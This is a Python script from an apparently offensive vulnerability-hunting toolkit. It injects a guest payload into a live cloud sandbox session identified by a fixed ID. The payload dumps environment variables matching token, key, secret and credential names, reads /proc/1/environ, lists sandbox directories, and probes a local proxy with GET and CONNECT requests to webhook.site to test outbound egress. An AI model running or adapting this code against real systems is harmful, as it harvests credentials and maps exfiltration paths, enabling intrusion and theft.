# -*- coding: utf-8 -*-
"""Phase3a: guest 凭据面 + 23456 代理语义探测"""
import sys
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import cmd

SID = "sbx_6M8Yg7kJadsCnQ8GlDyTeZJa6VaY"

GUEST = r'''
import socket, os, subprocess

def t(name, fn):
    try:
        r = fn()
        print('[%s] -> %r' % (name, r), flush=True)
    except Exception as e:
        print('[%s] EXC %s: %s' % (name, type(e).__name__, e), flush=True)

print('--- env ---', flush=True)
env = os.environ
for k in sorted(env):
    if any(x in k.lower() for x in ['token', 'key', 'oidc', 'secret', 'cred', 'vercel', 'auth']):
        print(k, '=', env[k][:200], flush=True)
print('--- /proc/1/environ ---', flush=True)
try:
    print(open('/proc/1/environ', 'rb').read()[:2000], flush=True)
except Exception as e:
    print('ERR', e, flush=True)
print('--- /run/cell ---', flush=True)
try:
    for f in os.listdir('/run/cell'):
        print(f, flush=True)
except Exception as e:
    print('ERR', e, flush=True)
print('--- ls /vercel/sandbox ---', flush=True)
try:
    print(subprocess.run(['ls', '-la', '/vercel/sandbox'], capture_output=True, text=True).stdout[:1000], flush=True)
except Exception as e:
    print('ERR', e, flush=True)
print('--- envall ---', flush=True)
print(subprocess.run(['env'], capture_output=True, text=True).stdout[:1500], flush=True)

def raw(port, payload, wait=3):
    s = socket.create_connection(('127.0.0.1', port), timeout=5)
    s.settimeout(wait)
    s.sendall(payload)
    try:
        return s.recv(4096)
    finally:
        s.close()

# 23456 proxy semantics
t('abs-uri GET http://webhook.site/', lambda: raw(23456, b'GET http://webhook.site/ HTTP/1.1\r\nHost: webhook.site\r\nConnection: close\r\n\r\n'))
t('CONNECT', lambda: raw(23456, b'CONNECT webhook.site:443 HTTP/1.1\r\nHost: webhook.site:443\r\n\r\n'))
t('OPTIONS *', lambda: raw(23456, b'OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n'))
print('done', flush=True)
'''

code = "cat > /tmp/pg3.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg3.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print("code:", c)
    print(r[:6000])
